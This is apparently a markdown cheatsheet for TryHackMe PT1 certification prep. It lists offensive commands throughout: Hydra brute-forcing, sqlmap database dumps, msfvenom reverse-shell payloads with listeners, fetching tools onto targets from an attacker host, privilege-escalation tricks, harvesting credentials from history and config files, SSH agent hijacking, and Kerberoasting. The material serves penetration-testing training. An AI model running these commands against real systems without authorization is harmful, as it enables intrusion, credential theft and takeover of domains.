# 🛡️ PT1 Junior Penetration Tester — Methodology Cheatsheet

> **TryHackMe PT1 Reference** | Commands, tools, and workflows for junior penetration testing engagements.

---

## Table of Contents
- [Network Penetration Testing](#-network-penetration-testing)
- [Web Application Testing](#-web-application-testing)
- [Reverse Shells & Listeners](#-reverse-shells--listeners)
- [Linux Privilege Escalation](#-linux-privilege-escalation)
- [Post-Exploitation & Lateral Movement](#-post-exploitation--lateral-movement)
- [Active Directory](#-active-directory)
- [Windows Privilege Escalation](#-windows-privilege-escalation)

---

## 🌐 Network Penetration Testing

### Initial Nmap Scan
Run a comprehensive scan and pipe results into Searchsploit for quick vuln identification.

```bash
# Full version + aggressive scan, output to XML
nmap -sV -A -p- -oX nmapresults.xml <target>

# Feed results into Searchsploit
searchsploit --nmap nmapresults.xml
```

---

### Service Enumeration by Port

| Service | Port | Command |
|---------|------|---------|
| FTP | 21 | `nmap -p 21 --script ftp-anon,ftp-brute <target>` |
| SSH | 22 | `nmap -p 22 --script ssh-brute <target>` |
| HTTP/HTTPS | 80, 443 | `nmap -p 80,443 --script http-enum <target>` |
| SMB | 445 | `nmap -p 445 --script smb-enum-shares,smb-enum-users <target>` |
| RDP | 3389 | `nmap -p 3389 --script rdp-enum-encryption <target>` |

---

### Brute Forcing with Hydra

```bash
# FTP brute force
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ftp://<target>

# SSH brute force
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target>

# HTTP POST login form
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Multiple usernames from a file
hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt ssh://<target>
```

---

## 🕸️ Web Application Testing

### Initial Scan
```bash
# Full version + aggressive scan, output to XML
nmap -sV -A -p- -oX nmapresults.xml <target>

# Feed results into Searchsploit
searchsploit --nmap nmapresults.xml
```

---

### Directory & Subdomain Enumeration

```bash
# Directory brute force
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/big.txt

# Virtual host / subdomain enumeration
gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# DNS subdomain enumeration (alternative)
gobuster dns -d <target-domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

---

### Tech Stack Fingerprinting

```bash
# Identify CMS, frameworks, server versions
whatweb http://<target>

# Curl headers for version info
curl -I http://<target>

# Wappalyzer (browser extension) — identify client-side tech stack visually
```

---

### Manual Content Discovery Checklist

```
[ ] /robots.txt          — may reveal hidden paths
[ ] /sitemap.xml         — enumerates site structure
[ ] Response headers     — check Server, X-Powered-By for versioning
[ ] /login.php / /admin  — check for auth portals
[ ] Source code          — comments may leak paths, credentials, API keys
[ ] Enumerate users      — names, emails, usernames from content
```

---

### BurpSuite — Request Manipulation

```
[ ] Capture all requests via proxy (set browser proxy to 127.0.0.1:8080)
[ ] Attempt parameter manipulation (change IDs, roles, values)
[ ] Check for JWT misuse — decode at jwt.io, test alg:none attack
[ ] Inspect cookies — test for predictable session tokens
[ ] Test for IDOR — change object IDs in requests (e.g., ?id=1 → ?id=2)
[ ] Test for privilege escalation via role parameters
```

---

### OWASP Top 10 — Tool Reference

| Vulnerability | Tool | Example Command |
|---------------|------|-----------------|
| SQL Injection | `sqlmap` | `sqlmap -u "http://<target>/page?id=1" --dbs` |
| SSTI | `sstimap` | `sstimap -u "http://<target>/page?name=test"` |
| XSS | `xsstrike` | `python3 xsstrike.py -u "http://<target>/page?q=test"` |
| CSRF | `xsrfprobe` | `python3 -m xsrfprobe -u http://<target>` |
| General Vulns | `nuclei` | `nuclei -u http://<target> -t cves/` |
| XXE | `xxeinjector` | `ruby XXEinjector.rb --host=<localIP> --file=request.txt` |

```bash
# SQLMap — dump a specific database
sqlmap -u "http://<target>/page?id=1" -D <dbname> --tables

# SQLMap — dump table contents
sqlmap -u "http://<target>/page?id=1" -D <dbname> -T <tablename> --dump

# Nuclei — scan with all templates
nuclei -u http://<target> -t nuclei-templates/
```

---

## 🐚 Reverse Shells & Listeners

### Generate Payload with MSFvenom

```bash
# Linux ELF reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f elf > shell.elf

# Windows EXE reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe > shell.exe

# PHP reverse shell (web upload)
msfvenom -p php/meterpreter_reverse_tcp LHOST=<your-ip> LPORT=4444 -f raw > shell.php

# ASP reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f asp > shell.asp
```

---

### Set Up Listener

```bash
# Netcat listener
nc -nvlp 4444

# Metasploit multi/handler (for meterpreter payloads)
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 4444
run
```

---

### Shell Stabilisation

```bash
# Step 1 — Drop into a PTY from meterpreter
shell

# Step 2 — Spawn a stable bash shell with Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or Python 2
python -c 'import pty; pty.spawn("/bin/bash")'

# Step 3 — Background and fix terminal size
Ctrl+Z
stty raw -echo; fg

# Step 4 — Fix terminal environment
export TERM=xterm
stty rows 38 cols 116

# Background a meterpreter session
background
```

---

## 🐧 Linux Privilege Escalation

### Initial Enumeration

```bash
# External Linux recon (unauthenticated)
enum4linux -a <target>

# Current user and privileges
whoami && id

# Check sudo rights
sudo -l

# Kernel version (look for kernel exploits)
uname -a

# OS version
cat /etc/os-release
```

---

### Find Useful Files

```bash
# Find flag files
find / -name "user.txt" 2>/dev/null
find / -name "root.txt" 2>/dev/null

# Find world-writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null

# Find SUID binaries (cross-ref with GTFOBins)
find / -perm -4000 -type f 2>/dev/null

# Find files owned by root but writable
find / -user root -writable -type f 2>/dev/null

# Find config files that may contain credentials
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | head -30
```

---

### linPEAS — Automated Enumeration

```bash
# Step 1 — Download linPEAS on your attack machine
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# Step 2 — Serve it via Python HTTP server
python3 -m http.server 8080

# Step 3 — On target machine, download linPEAS
wget http://<your-ip>:8080/linpeas.sh
# or
curl -O http://<your-ip>:8080/linpeas.sh

# Step 4 — Make executable and run
chmod +x linpeas.sh && ./linpeas.sh

# Step 5 — Cross-reference SUID/sudo results with GTFOBins
# https://gtfobins.github.io/
```

---

### Common Priv Esc Vectors

```bash
# Sudo abuse — check sudo -l, then GTFOBins
sudo vim -c ':!/bin/bash'

# Cron jobs — look for writable scripts run as root
cat /etc/crontab
ls -la /etc/cron*

# SUID binary abuse (example: find)
find . -exec /bin/bash -p \; -quit

# PATH hijacking — if a SUID script calls a binary without full path
echo '/bin/bash' > /tmp/<binaryname>
chmod +x /tmp/<binaryname>
export PATH=/tmp:$PATH
```

---

## 🔁 Post-Exploitation & Lateral Movement

### SSH-Based Movement

```bash
# Find private SSH keys on target
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Fix permissions and authenticate
chmod 600 id_rsa
ssh -i id_rsa <user>@<target-ip>
```

---

### Credential Reuse

```bash
# Search bash history for credentials
cat /home/*/.bash_history
cat ~/.bash_history

# Search config files for passwords
grep -ri "password" /etc/ 2>/dev/null
grep -ri "passwd" /var/www/ 2>/dev/null

# Check auth logs
cat /var/log/auth.log | grep -i "password"
```

---

### SSH Session Hijacking

```bash
# Find active SSH agent sockets
find /tmp -name "ssh-*" 2>/dev/null

# Hijack the agent socket
SSH_AUTH_SOCK=/tmp/ssh-<socket-id>/agent.<pid> ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-<socket-id>/agent.<pid> ssh <user>@<target>
```

---

### Internal Network Recon

```bash
# Show internal IPs and interfaces
ip a

# Show routing table / reachable subnets
ip route

# Map internal hostnames
cat /etc/hosts

# ARP table — find live hosts
arp -a

# Quick ping sweep (if nmap unavailable)
for i in {1..254}; do ping -c1 -W1 192.168.1.$i &>/dev/null && echo "192.168.1.$i UP"; done
```

---

### Port Forwarding

```bash
# Local port forward — forward remote port to local machine
# Access target's port 80 via localhost:8080
ssh -L 8080:127.0.0.1:80 <user>@<target-ip>

# Dynamic SOCKS proxy — route all traffic through target
ssh -D 1080 <user>@<target-ip>
# Then use proxychains to run tools through the proxy
proxychains nmap -sT -Pn 10.10.10.0/24

# Remote port forward — expose your local port to target
ssh -R 4444:127.0.0.1:4444 <user>@<target-ip>
```

---

## 🏰 Active Directory

### Attack Flow
```
Initial Access → Enumeration → Identify Weakness → Exploit → Privilege Escalation → Own Domain
```

### What to Look For

| Target | Goal |
|--------|------|
| **Users** | Who exists in the domain |
| **Groups** | Who is in privileged groups (Domain Admins, etc.) |
| **Computers** | What machines are joined to the domain |
| **Shares** | Readable SMB shares with sensitive data |
| **Policies** | Weak password policies (min length, complexity) |
| **Trusts** | Trust relationships with other domains |

---

### Initial Nmap Scan — AD Ports

```bash
nmap -sV -A -p- -oX nmapresults.xml <target>
searchsploit --nmap nmapresults.xml
```

| Port | Service | Notes |
|------|---------|-------|
| 88 | Kerberos | Authentication in AD |
| 135 | RPC | Remote Procedure Call |
| 139 | NetBIOS | Legacy SMB support |
| 389 | LDAP | Directory queries |
| 445 | SMB | File sharing + enumeration |
| 636 | LDAPS | LDAP over SSL |
| 3268 | Global Catalog | Domain-wide user search |

---

### SMB Enumeration

```bash
# All-in-one enumeration
enum4linux -a <target>

# CrackMapExec — enumerate users
crackmapexec smb <target> --users

# CrackMapExec — enumerate shares
crackmapexec smb <target> --shares

# List SMB shares (null session)
smbclient -L //<target> -N

# Connect to a share (null session)
smbclient //<target>/<sharename> -N

# Map shares with permissions
smbmap -H <target>

# Map shares with credentials
smbmap -H <target> -u <username> -p <password>
```

---

### LDAP Enumeration

```bash
# All-in-one LDAP enumeration
enum4linux-ng -A <target>

# LDAP anonymous query
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=person)"

# Query for all users
ldapsearch -x -H ldap://<target> -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName
```

---

### RPC Enumeration

```bash
# Check for null session access
rpcclient -U "" <target> -N

# Once connected — enumerate domain users
rpcclient $> enumdomusers

# Enumerate domain groups
rpcclient $> enumdomgroups

# Get user info
rpcclient $> queryuser <RID>
```

---

### RID Cycling

```bash
# Common RID values
# 500  = Administrator
# 501  = Guest
# 512  = Domain Admins
# 513  = Domain Users
# 514  = Domain Guests

# RID cycling with CrackMapExec
crackmapexec smb <target> -u '' -p '' --rid-brute

# RID cycling with enum4linux
enum4linux -r -u "" -p "" <target>
```

---

### BloodHound + SharpHound

```bash
# Step 1 — Run SharpHound on the target (Windows) to collect data
.\SharpHound.exe -c All --outputdirectory C:\temp\

# Step 2 — Transfer the resulting .zip back to your machine
# (use smbserver, python http server, or nc)

# Step 3 — Start neo4j and BloodHound on your attack machine
sudo neo4j start
bloodhound &

# Step 4 — Upload the .zip to BloodHound UI
# Drag and drop the SharpHound zip into the BloodHound interface

# Step 5 — Run pre-built queries
# "Find Shortest Paths to Domain Admins"
# "Find all Domain Admins"
# "Principals with DCSync Rights"
```

---

### Kerberoasting

```bash
# Request service tickets for all SPNs, then crack offline
impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <target> -request

# Crack the TGS ticket with hashcat
hashcat -m 13100 ticket.txt /usr/share/wordlists/rockyou.txt
```

---

### AS-REP Roasting

```bash
# Find accounts with pre-auth disabled and grab their hashes
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <target> -no-pass

# Crack the AS-REP hash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## 🪟 Windows Privilege Escalation

### Initial Enumeration

```bash
# Current user and privileges
whoami
whoami /priv
whoami /groups

# System info (look for unpatched vulnerabilities)
systeminfo

# List running processes
tasklist /SVC

# List installed services
sc query type= all

# Check scheduled tasks
schtasks /query /fo LIST /v

# List users and groups
net users
net localgroup administrators
```

---

### winPEAS — Automated Enumeration

```powershell
# Download winPEAS on your attack machine and serve it
python3 -m http.server 8080

# On target — download winPEAS (PowerShell)
Invoke-WebRequest -Uri http://<your-ip>:8080/winPEASx64.exe -OutFile C:\Temp\winpeas.exe

# Alternatively with certutil
certutil -urlcache -f http://<your-ip>:8080/winPEASx64.exe C:\Temp\winpeas.exe

# Run winPEAS
C:\Temp\winpeas.exe

# Cross-reference results with LOLBAS
# https://lolbas-project.github.io/
```

---

### Common Windows Priv Esc Vectors

```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

# Weak service permissions (check with accesschk)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# AlwaysInstallElevated — check if enabled
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Check stored credentials
cmdkey /list
```

---

*Cheatsheet generated for TryHackMe PT1 Junior Penetration Tester certification prep.*
